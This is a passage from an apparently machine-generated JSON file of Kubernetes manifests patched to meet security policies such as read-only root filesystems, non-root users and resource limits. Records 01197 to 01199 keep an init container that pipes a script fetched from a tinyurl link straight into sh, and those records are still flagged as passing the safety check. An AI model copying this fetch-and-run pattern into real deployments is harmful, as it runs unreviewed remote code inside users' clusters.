256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01197",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: 3davinci/tinyweb:0.1\n        imagePullPolicy: Always\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /var/www/localhost/app\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      initContainers:\n      - name: init\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01198",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: 3davinci/tinyweb:0.1\n        imagePullPolicy: Always\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /var/www/localhost/app\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      initContainers:\n      - name: init\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01199",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: 3davinci/tinyweb:0.1\n        imagePullPolicy: Always\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /var/www/localhost/app\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      initContainers:\n      - name: init\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01200",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\n  labels:\n    app: postgres\n    group: db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n        type: db\n    spec:\n      volumes:\n      - name: postgres-storage\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n      containers:\n      - name: postgres\n        image: postgres:9.6-alpine\n        ports:\n        - containerPort: 5432\n        envFrom:\n        - configMapRef:\n            name: postgres-config\n        volumeMounts:\n        - name: postgres-storage\n          mountPath: /var/lib/postgresql/data\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01201",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\n  labels:\n    app: postgres\n    group: db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n        type: db\n    spec:\n      volumes:\n      - name: postgres-storage\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n      containers:\n      - name: postgres\n        image: postgres:9.6-alpine\n        ports:\n        - containerPort: 5432\n        envFrom:\n        - configMapRef:\n            name: postgres-config\n        volumeMounts:\n        - name: postgres-storage\n          mountPath: /var/lib/postgresql/data\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01202",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\n  labels:\n    app: postgres\n    group: db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n        type: db\n    spec:\n      volumes:\n      - name: postgres-storage\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n      containers:\n      - name: postgres\n        image: postgres:9.6-alpine\n        ports:\n        - containerPort: 5432\n        envFrom:\n        - configMapRef:\n            name: postgres-config\n        volumeMounts:\n        - name: postgres-storage\n          mountPath: /var/lib/postgresql/data\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01203",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\n  labels:\n    app: postgres\n    group: db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n        type: db\n    spec:\n      volumes:\n      - name: postgres-storage\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n      containers:\n      - name: postgres\n        image: postgres:9.6-alpine\n        ports:\n        - containerPort: 5432\n        envFrom:\n        - configMapRef:\n            name: postgres-config\n        volumeMounts:\n        - name: postgres-storage\n          mountPath: /var/lib/postgresql/data\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01204",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      name: nginx-pod\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx:stable\n        ports:\n        - containerPort: 80\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01205",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      name: nginx-pod\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx:stable\n        ports:\n        - containerPort: 80\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01206",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      name: nginx-pod\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx:stable\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01207",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      name: nginx-pod\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx:stable\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01208",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cidotnet-rc\nspec:\n  replicas: 1\n  selector:\n    app: cidotnet-app\n  template:\n    metadata:\n      labels:\n        app: cidotnet-app\n    spec:\n      containers:\n      - name: cidotnet-pod\n        image: markaw/cidotnet-app:stable\n        ports:\n        - containerPort: 80\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01209",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cidotnet-rc\nspec:\n  replicas: 1\n  selector:\n    app: cidotnet-app\n  template:\n    metadata:\n      labels:\n        app: cidotnet-app\n    spec:\n      containers:\n      - name: cidotnet-pod\n        image: markaw/cidotnet-app:stable\n        ports:\n        - containerPort: 80\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01210",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cidotnet-rc\nspec:\n  replicas: 1\n  selector:\n    app: cidotnet-app\n  template:\n    metadata:\n      labels:\n        app: cidotnet-app\n    spec:\n      containers:\n      - name: cidotnet-pod\n        image: markaw/cidotnet-app:stable\n        ports:\n        - containerPort: 80\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01211",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cidotnet-rc\nspec:\n  replicas: 1\n  selector:\n    app: cidotnet-app\n  template:\n    metadata:\n      labels:\n        app: cidotnet-app\n    spec:\n      containers:\n      - name: cidotnet-pod\n        image: markaw/cidotnet-app:stable\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01212",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cidotnet-rc\nspec:\n  replicas: 1\n  selector:\n    app: cidotnet-app\n  template:\n    metadata:\n      labels:\n        app: cidotnet-app\n    spec:\n      containers:\n      - name: cidotnet-pod\n        image: markaw/cidotnet-app:stable\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01213",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: upstream\nspec:\n  selector:\n    matchLabels:\n      app: upstream\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: upstream\n    spec:\n      containers:\n      - name: upstream\n        image: signalrbenchmark/perf:1.4.4\n        resources:\n          requests:\n            cpu: 100m\n            memory: 1024Mi\n          limits:\n            cpu: 150m\n            memory: 1024Mi\n        volumeMounts:\n        - mountPath: /mnt/perf\n          name: volume\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - cp /mnt/perf/manifest/SignalRUpstream/SignalRUpstream.zip /home ; cd /home\n          ; unzip SignalRUpstream.zip ; exec ./SignalRUpstream\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: volume\n        azureFile:\n          secretName: azure-secret\n          shareName: perf\n          readOnly: false\n",
    "errors": []
  },
  {
    "id": "01214",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: upstream\nspec:\n  selector:\n    matchLabels:\n      app: upstream\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: upstream\n    spec:\n      containers:\n      - name: upstream\n        image: signalrbenchmark/perf:1.4.4\n        resources:\n          requests:\n            cpu: 100m\n            memory: 1024Mi\n          limits:\n            cpu: 150m\n            memory: 1024Mi\n        volumeMounts:\n        - mountPath: /mnt/perf\n          name: volume\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - cp /mnt/perf/manifest/SignalRUpstream/SignalRUpstream.zip /home ; cd /home\n          ; unzip SignalRUpstream.zip ; exec ./SignalRUpstream\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: volume\n        azureFile:\n          secretName: azure-secret\n          shareName: perf\n          readOnly: false\n",
    "errors": []
  },
  {
    "id": "01215",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: local-redis\n  labels:\n    deployment: local-redis\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      pod: local-redis\n  template:\n    metadata:\n      labels:\n        pod: local-redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:alpine\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        ports:\n        - containerPort: 6379\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01216",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: local-redis\n  labels:\n    deployment: local-redis\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      pod: local-redis\n  template:\n    metadata:\n      labels:\n        pod: local-redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:alpine\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        ports:\n        - containerPort: 6379\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01217",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: local-redis\n  labels:\n    deployment: local-redis\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      pod: local-redis\n  template:\n    metadata:\n      labels:\n        pod: local-redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:alpine\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        ports:\n        - containerPort: 6379\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01218",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: dhcp-server\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: dhcp-server\n  template:\n    metadata:\n      labels:\n        app: dhcp-server\n    spec:\n      containers:\n      - args:\n        - sleep 1000000000;\n        command:\n        - /bin/sh\n        - -c\n        - --\n        image: xunholy/dhcp-server:stable\n        imagePullPolicy: Always\n        name: dhcp-server\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /etc/dhcp\n          name: server-config\n      volumes:\n      - emptyDir: {}\n        name: server-config\n",
    "errors": []
  },
  {
    "id": "01219",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: dhcp-server\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: dhcp-server\n  template:\n    metadata:\n      labels:\n        app: dhcp-server\n    spec:\n      containers:\n      - args:\n        - sleep 1000000000;\n        command:\n        - /bin/sh\n        - -c\n        - --\n        image: xunholy/dhcp-server:stable\n        imagePullPolicy: Always\n        name: dhcp-server\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        volumeMounts:\n        - mountPath: /etc/dhcp\n          name: server-config\n      volumes:\n      - emptyDir: {}\n        name: server-config\n",
    "errors": []
  },
  {
    "id": "01220",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: dhcp-server\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: dhcp-server\n  template:\n    metadata:\n      labels:\n        app: dhcp-server\n    spec:\n      containers:\n      - args:\n        - sleep 1000000000;\n        command:\n        - /bin/sh\n        - -c\n        - --\n        image: xunholy/dhcp-server:stable\n        imagePullPolicy: Always\n        name: dhcp-server\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /etc/dhcp\n          name: server-config\n      volumes:\n      - emptyDir: {}\n        name: server-config\n",
    "errors": []
  },
  {
    "id": "01221",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: dhcp-server\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: dhcp-server\n  template:\n    metadata:\n      labels:\n        app: dhcp-server\n    spec:\n      containers:\n      - args:\n        - sleep 1000000000;\n        command:\n        - /bin/sh\n        - -c\n        - --\n        image: xunholy/dhcp-server:stable\n        imagePullPolicy: Always\n        name: dhcp-server\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /etc/dhcp\n          name: server-config\n      volumes:\n      - emptyDir: {}\n        name: server-config\n",
    "errors": []
  },
  {
    "id": "01222",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
